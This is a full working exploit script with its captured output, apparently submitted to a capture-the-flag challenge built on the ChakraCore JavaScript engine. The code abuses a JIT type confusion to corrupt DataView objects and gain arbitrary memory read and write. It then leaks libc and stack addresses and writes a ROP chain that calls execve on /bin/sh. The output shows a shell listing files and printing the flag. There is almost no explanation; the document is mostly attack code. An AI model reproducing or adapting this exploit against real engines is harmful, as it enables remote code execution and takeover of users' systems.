
Enter JS Code:
var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);
var BASE = 0x100000000;

function hex(x) {
    return `0x${x.toString(16)}`
}


function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}


function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

obj = {}
obj.a = 0x48; // index 0
obj.b = 0x42; // index 1
obj.c = 0x48; // index 2
obj.d = 0x42; // index 3
obj.e = 0x40; // index 4
obj.f = 0x40; // ...
obj.g = 0x90;
obj.h = 0x90;
obj.i = 0x90;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);

    o.f = dv1;

    obj.h = dv2;

    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return dv2.getUint32(0, true) + dv2.getUint32(4, true) * BASE;
    }

    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // write to addr (Step 5)
        dv2.setUint32(0, value_lo, true);
        dv2.setUint32(4, value_hi, true);
    }

    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);

    base_lo = vtable_lo - 0xe046e0;
    base_hi = vtable_hi;
    base = base_lo + base_hi * 0x100000000;

    memset_got_lo = base_lo + 0x000e53248;
    memset_got_hi = base_hi;
    memset_libc = read64(memset_got_lo, memset_got_hi);

    libc_base = memset_libc - 0x18ef50;
    environ = libc_base + 0x3ee098;
    stack_addr = read64(environ % BASE, environ / BASE);
    console.log(hex(stack_addr));

    execve = libc_base + 937520;
    pop_rdi = libc_base + 0x000000000002155f;
    pop_rsi = libc_base + 0x0000000000023e6a;


    rsp_value_hi = stack_addr / BASE;
    rsp_value_lo = stack_addr % BASE - 0x1940;

    //write /bin/sh
    write64(stack_addr % BASE, stack_addr / BASE, 0x6e69622f, 0x0068732f);

    String.prototype.slice.call('', { valueOf : () => { // This will overwrite a return address from a
                                                    // code path related to slice()
                                                    print("hello world");
                                                    write64(rsp_value_lo, rsp_value_hi, pop_rdi % BASE, pop_rdi / BASE);
                                                    write64(rsp_value_lo + 8, rsp_value_hi, stack_addr % BASE, stack_addr / BASE);
                                                    write64(rsp_value_lo + 16, rsp_value_hi, pop_rsi % BASE, pop_rsi / BASE);
                                                    write64(rsp_value_lo + 24, rsp_value_hi, 0, 0);
                                                    write64(rsp_value_lo + 32, rsp_value_hi, execve % BASE, execve / BASE);
                                                    write64(rsp_value_lo + 40, rsp_value_hi, 0x41414141, 0x41414141);
                                                  }});
}

main();

.
JS Output:
0x7ffe61883988
hello world
ls
bin
ch
dev
flag
lib
lib64
libChakraCore.so
tmp
cat flag
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
